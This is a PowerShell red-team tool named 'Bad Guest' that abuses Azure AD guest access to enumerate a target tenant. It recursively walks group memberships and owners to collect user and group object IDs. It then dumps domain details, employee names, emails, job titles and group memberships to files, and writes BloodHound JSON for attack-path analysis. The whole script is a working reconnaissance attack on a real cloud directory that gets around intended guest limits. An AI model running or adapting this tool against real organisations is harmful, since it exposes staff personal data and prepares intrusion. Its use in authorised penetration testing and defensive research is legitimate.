# bad guest - do user enumeration as a lowly guest
# this is not allowed through any normal means
# 2021 @nyxgeek - TrustedSec
# 2024 @yeeb_ - Laokoon Security


 param(
    [string] $tenantid,
    [switch] $verbose
)

$ownerids_array = @()
$groupids_array = @()
$groupmemberids_array = @()

$userlist_array = @()
$grouplist_array = @()
$groupmembership_array = @()
$devicelist_array = @()
$azureobjectlist_array = @()

$bhData = @()

# Suppress warnings
$WarningPreference = 'SilentlyContinue'

function displayArrayStats {
    if ($ownerids_array) {
        Write-Host "Here is our current list of owner ObjectIds:"
        $temparray = $script:ownerids_array | Sort-Object -Unique
        foreach ($item in $temparray) { Write-Host "$item" }
    } else {
        Write-Host "No owner ObjectIds for target tenant"
    }

    if ($groupmemberids_array) {
        Write-Host "Here is our current list of user ObjectIds:"
        $temparray = $script:groupmemberids_array | Sort-Object -Unique
        foreach ($item in $temparray) { Write-Host "$item" }
    } else {
        Write-Host "No user ObjectIds for target tenant"
    }

    if ($groupids_array) {
        Write-Host "Here is our current list of group ObjectIds:"
        $temparray = $script:groupids_array | Sort-Object -Unique
        foreach ($item in $temparray) { Write-Host "$item" }
    } else {
        Write-Host "No group ObjectIds for target tenant"
    }
}

# Hash tables to track already processed groups and users
$processedGroupIds = @{}
$processedUserIds = @{}

function magic($temp_objectId) {
    try {
        if ($verbose) { Write-Host "Testing ObjectId: $temp_objectId" }
        
        # Check if the user exists before proceeding
        $userExists = Get-AzureADUser -ObjectId $temp_objectId -ErrorAction SilentlyContinue
        if (-not $userExists) {
            Write-Warning "User with ObjectId $temp_objectId does not exist or is inaccessible."
            return
        }

        # Avoid reprocessing this user before fully enumerating their data
        if ($processedUserIds[$temp_objectId]) {
            Write-Host "[-] User with ObjectId $temp_objectId has already been processed."
            return
        }

        # Enumerate the groups the current user belongs to
        $usergroups = Get-AzureADUserMembership -ObjectId $temp_objectId -ErrorAction Stop |
            Where-Object -Property ObjectType -eq "Group" |
            Select-Object -Property ObjectId

        if ($usergroups) {
            Write-Host "[+] Successfully retrieved groups for user with ObjectId $temp_objectId."

            foreach ($group in $usergroups) {
                # Avoid reprocessing this group
                if ($processedGroupIds[$group.ObjectId]) {
                    Write-Host "[-] Group with ObjectId $($group.ObjectId) has already been processed."
                    continue
                }
                $processedGroupIds[$group.ObjectId] = $true

                $script:groupids_array += $group.ObjectId
                Write-Host "[+] Added group ObjectId: $($group.ObjectId)"

                # Get the owners of the group
                try {
                    $owners = Get-AzureADGroupOwner -ObjectId $group.ObjectId -ErrorAction SilentlyContinue
                    if ($owners) {
                        foreach ($owner in $owners) {
                            if (-not $processedUserIds[$owner.ObjectId]) {
                                $script:ownerids_array += $owner.ObjectId
                                Write-Host "[+] Added owner ObjectId: $($owner.ObjectId)"
                            }
                        }
                    } else {
                        Write-Host "[-] No owners found for group ObjectId: $($group.ObjectId)"
                    }
                } catch {
                    Write-Error "Failed to retrieve owners for group ObjectId ${group.ObjectId}: $_"
                }

                # Get the members of the group who are not external users
                try {
                    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -ErrorAction SilentlyContinue |
                        Where-Object -Property UserPrincipalName -NotLike "*EXT*"
                    if ($members) {
                        foreach ($member in $members) {
                            if (-not $processedUserIds[$member.ObjectId]) {
                                $script:groupmemberids_array += $member.ObjectId
                                Write-Host "[+] Added member ObjectId: $($member.ObjectId)"
                            }
                        }
                        Write-Host "[+] Successfully retrieved members for group ObjectId: $($group.ObjectId)"
                    } else {
                        Write-Host "[-] No members found for group ObjectId: $($group.ObjectId)"
                    }
                } catch {
                    Write-Error "Failed to retrieve members for group ObjectId ${group.ObjectId}: $_"
                }
            }
        } else {
            Write-Warning "[-] The user with ObjectId $temp_objectId is not a member of any groups."
        }

        # Mark the user as processed only after their groups have been fully enumerated
        $processedUserIds[$temp_objectId] = $true
    } catch {
        if ($_.Exception.Message -like "*ResourceNotFound*") {
            Write-Warning "ResourceNotFound: ObjectId $temp_objectId does not exist."
        } else {
            Write-Error "An unexpected error occurred while processing ObjectId ${temp_objectId}: $_"
        }
    }
}

Write-Host "`n**********************************************************************"
Write-Host "*************************      BAD GUEST       ***********************"
Write-Host "**********************************************************************"
Write-Host "******   A tool for abusing Guest Access to Enumerate Azure AD *******"
Write-Host "****** *******   2021.10.09  @nyxgeek - TrustedSec    *******  *******"
Write-Host "**********************************************************************"
Write-Host "**********************************************************************`n"

# Connect to Azure - We need to do this whether or not we know the tenant
Write-Host "Connecting with Connect-AzAccount"
Connect-AzAccount

$target_tenantid = ""
if ($tenantid) {
    $target_tenantid = $tenantid
    Write-Host "Tenant id supplied: $target_tenantid"
} else {
    # Retrieve a list of tenant IDs
    Start-Sleep -Seconds 1
    $target_tenantid = (Get-AzTenant).id

    # If there's more than 1 tenant, the user must select one
    if ($target_tenantid) {
        Get-AzTenant | Select-Object -Property Name, Domains, id
        $tenant_searchstring = Read-Host -Prompt "`nPlease enter part of a domain name to match on"
        # Match but only take the first item returned
        $target_tenantid = (Get-AzTenant | Where-Object -Property Domains -like "*$tenant_searchstring*" | Select-Object -First 1).id
    }
}

Write-Host "Getting an access token in tenant $target_tenantid"
# Getting an access token for Graph
$newtoken = Get-AzAccessToken -TenantId $target_tenantid -Resource "https://graph.microsoft.com/"

# Getting information about current user via Graph
$graphresponse = Invoke-RestMethod https://graph.microsoft.com/v1.0/me -Headers @{ Authorization = "Bearer $($newtoken.token)" }

# Getting our current user's ObjectId
$currentuser_objectid = $graphresponse.id
Write-Host "Successfully retrieved current user ObjectId: $currentuser_objectid"

# Getting tenant details
$tenantDetails = Get-AzTenant | Where-Object { $_.Id -eq $target_tenantid }
$tenantName = $tenantDetails.DisplayName

# Connect to AzureAD Target Tenant
Write-Host "Connecting with Connect-AzureAD"
Connect-AzureAD -TenantId $target_tenantid

### SETTING UP FOLDER FOR OUR DUMP
[boolean]$pathIsOK = $false
$projectname = Read-Host -Prompt "Please enter a project name"
$inputclean = '[^a-zA-Z]'
$projectname = $projectname -replace $inputclean, ''

while (-not $pathIsOK) {
    if (-not (Test-Path $projectname)) {
        try {
            New-Item -ItemType Directory -Path $projectname -ErrorAction Stop | Out-Null
            $CURRENTJOB = "./${projectname}/${projectname}"
            $pathIsOK = $true
        } catch {
            Write-Error "Error trying to create path: $_"
            $projectname = Read-Host -Prompt "Please enter a different project name"
            $projectname = $projectname -replace $inputclean, ''
        }
    } else {
        $projectname = Read-Host -Prompt "File exists. Please enter a different project name"
        $projectname = $projectname -replace $inputclean, ''
        $pathIsOK = $false
    }
}
########################### ############################ ##############################

Write-Host "`n**********************************************************************"
Write-Host "*******************   MINING FOR OBJECTID GUIDS   ********************"
Write-Host "**********************************************************************`n"

# NOW THE MAGIC :)
[boolean]$areWeDoneChecking = $false
$currentRound = 1
$itemcount = 0
$lastcount = 0
$groupmemberids_array += $currentuser_objectid

while (-not $areWeDoneChecking) {
    Write-Host "Round $currentRound @ $(Get-Date)"
    $temparray = $ownerids_array + $groupmemberids_array | Sort-Object -Unique
    $itemcount = $temparray.Count
    Write-Host "Total users enumerated is $itemcount"

    foreach ($user_objectid in $temparray) {
        try {
            magic $user_objectid
        } catch {
            Write-Error "Error processing user ObjectId ${user_objectid}: $_"
        }
    }

    if ($lastcount -eq $itemcount) {
        Write-Host "Looks like we've hit the max number of objects we are going to get..."
        $areWeDoneChecking = $true
    } else {
        $lastcount = $itemcount
        $areWeDoneChecking = $false
    }
    $currentRound++
}

if ($verbose) {
    displayArrayStats
}

########################### PHASE 2 - GATHER WHAT WE CAN ##############################
Write-Host "`n**********************************************************************"
Write-Host "*************************  LET'S BE BAD GUYS   ***********************"
Write-Host "**********************************************************************`n"

try {
    Write-Host -NoNewline "[*] Retrieving AzureAD Domain Information ... "
    $domain_info = Get-AzureADDomain -ErrorAction Stop
    $domain_info | Select-Object -Property * | Out-File -FilePath ".\${CURRENTJOB}.GuestAccess.DomainInfo.txt"
    Write-Host "`t`t`tDONE"
} catch {
    Write-Error "Failed to retrieve AzureAD Domain Information: $_"
}

# Collect Users
Write-Host -NoNewline "[*] Retrieving AzureAD User Information ..."
foreach ($user_objectid in $temparray) {
    $user = Get-AzureADUser -ObjectId $user_objectid -ErrorAction Stop
    $userlist_array += $user

    # Populate AZUser node
    $bhUser = @{
        "kind" = "AZUser"
        "data" = @{
            "id" = $user.ObjectId
            "displayName" = $user.DisplayName
            "userPrincipalName" = $user.UserPrincipalName
            "mail" = $user.UserPrincipalName  # mail = userPrincipalName
            "userType" = $user.UserType
            "tenantId" = $target_tenantid
            "tenantName" = $tenantName
            # Include other necessary properties with empty values
            "accountEnabled" = $user.AccountEnabled
            "createdDateTime" = $user.CreationType
            "employeeOrgData" = @{}
            "lastPasswordChangeDateTime" = $null
            "mailboxSettings" = @{
                "automaticRepliesSetting" = @{
                    "scheduledEndDateTime" = @{}
                    "scheduledStartDateTime" = @{}
                }
                "language" = @{}
                "workingHours" = @{
                    "timeZone" = $null
                }
            }
            "onPremisesExtensionAttributes" = @{}
            "onPremisesSecurityIdentifier" = $user.OnPremisesSecurityIdentifier
            "onPremisesSyncEnabled" = $user.OnPremisesSyncEnabled
            "passwordProfile" = @{}
        }
    }
    $bhData += $bhUser
}
Write-Host "`t`t`tDONE"

# Create simple Azure AD user list
Write-Host -NoNewline "[*] Creating simple Azure AD user list ... "
foreach($line in $userlist_array){
    $line.UserPrincipalName.Trim(" ") | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist.txt 
    echo "$($line.DisplayName), $($line.UserPrincipalName), $($line.Department), $($line.JobTitle), $($line.OtherMails), $($line.ObjectId)" | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist_Detailed.txt 
}
Write-Host "`t`t`tDONE"

# Grabbing O365 LDAP style user data
Write-Host -NoNewline "[*] Grabbing O365 LDAP style user data ... "
$userlist_array | Select-Object -Property * | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist_LDAP.txt
Write-Host "`t`t`tDONE"

# Collect Groups
Write-Host -NoNewline "[*] Getting Group list ..."
$temp_groupids = $groupids_array | Sort-Object -Unique
foreach ($group_objectid in $temp_groupids) {
    $group = Get-AzureADGroup -ObjectId $group_objectid
    $grouplist_array += $group

    # Populate AZGroup node
    $bhGroup = @{
        "kind" = "AZGroup"
        "data" = @{
            "id" = $group.ObjectId
            "displayName" = $group.DisplayName
            "description" = $group.Description
            "mail" = $group.Mail
            "mailEnabled" = $group.MailEnabled
            "mailNickname" = $group.MailNickname
            "onPremisesLastSyncDateTime" = $group.OnPremisesLastSyncDateTime
            "onPremisesSamAccountName" = $group.OnPremisesSamAccountName
            "onPremisesSecurityIdentifier" = $group.OnPremisesSecurityIdentifier
            "onPremisesSyncEnabled" = $group.OnPremisesSyncEnabled
            "proxyAddresses" = $group.ProxyAddresses
            "renewedDateTime" = $group.RenewedDateTime
            "securityEnabled" = $group.SecurityEnabled
            "securityIdentifier" = $group.SecurityIdentifier
            "tenantId" = $target_tenantid
            "tenantName" = $tenantName
            # Include other necessary properties with empty values
            "createdDateTime" = $group.CreatedDateTime
        }
    }
    $bhData += $bhGroup

    $group.DisplayName.Trim(" ") | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist.txt
    $group | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist2.txt
    echo "$($group.DisplayName), $($group.Mail), $($group.Description), $($group.ObjectId)" | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist_Detailed.txt
}
Write-Host "`t`t`t`t`tDONE"

# Collect Group Owners
Write-Host -NoNewline "[*] Getting Group Owners ..."
foreach ($group in $grouplist_array) {
    $owners = Get-AzureADGroupOwner -ObjectId $group.ObjectId -ErrorAction SilentlyContinue
    $ownerData = @()

    if ($owners) {
        foreach ($owner in $owners) {
            $ownerData += @{
                "groupId" = $group.ObjectId
                "owner" = @{
                    "@odata.type" = "#microsoft.graph.user"
                    "accountEnabled" = $owner.AccountEnabled
                    "displayName" = $owner.DisplayName
                    "id" = $owner.ObjectId
                    "userPrincipalName" = $owner.UserPrincipalName
                    "userType" = $owner.UserType
                    # Include other necessary properties with empty values
                }
            }
        }
    }

    $bhGroupOwner = @{
        "kind" = "AZGroupOwner"
        "data" = @{
            "owners" = $ownerData
            "groupId" = $group.ObjectId
        }
    }
    $bhData += $bhGroupOwner
}
Write-Host "`t`t`tDONE"

# Collect Group Members
Write-Host -NoNewline "[*] Getting Group Membership (this could take a while...) "
foreach ($group in $grouplist_array) {
    $groupMembers = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true | Select-Object -Property ObjectId, DisplayName, UserPrincipalName
    $memberData = @()

    foreach ($member in $groupMembers) {
        $memberData += @{
            "groupId" = $group.ObjectId
            "member" = @{
                "@odata.type" = "#microsoft.graph.user"
                "id" = $member.ObjectId
                "displayName" = $member.DisplayName
                # Include other necessary properties with empty value
                "createdDateTime" = $null
            }
        }

        $gml_line = "$($group.DisplayName.Trim(" ")):$($member.UserPrincipalName)"
        $gml_line | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.GroupMembership.txt
    }

    $bhGroupMember = @{
        "kind" = "AZGroupMember"
        "data" = @{
            "members" = $memberData
            "groupId" = $group.ObjectId
        }
    }
    $bhData += $bhGroupMember
}
Write-Host "`tDONE"

if ($verbose){
    Write-Host "`n*********************************************************************`n"
    write-host "Group Membership:"
    foreach ($line in Get-Content -Path .\${CURRENTJOB}.GuestAccess.GroupMembership.txt) {
        Write-Host $line
    }
    Write-Host "`n*********************************************************************`n"
}

$finalData = @{
    "data" = $bhData
}

$bloodHoundJson = $finalData | ConvertTo-Json -Depth 20
$bloodHoundJson | Out-File -FilePath ".\${CURRENTJOB}.bh.json" -Encoding UTF8
Write-Host "[+] bh data saved to .\${CURRENTJOB}.bh.json"

